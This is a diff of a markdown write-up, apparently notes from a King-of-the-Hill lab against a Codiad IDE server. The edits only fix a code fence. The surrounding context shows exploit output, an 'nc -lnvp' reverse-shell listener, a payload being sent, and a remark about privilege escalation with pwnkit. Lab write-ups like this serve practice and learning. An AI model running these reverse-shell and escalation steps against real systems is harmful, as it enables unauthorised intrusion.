@@ -162,7 +162,7 @@ Shellcodes: No Results
 
 _got a reverse shell from the exploit_
 
-``bash
+```bash
 [+] Exploit finished!
 [+] Enjoy your reverse shell!
 ┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
@@ -179,6 +179,7 @@ nc -lnvp 9579
 [+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
 [+] Writeable Path : /var/www/html/codiad_projects
 [+] Sending payload...
+
 ```
 
 _privialge excalation done with pwnkit_
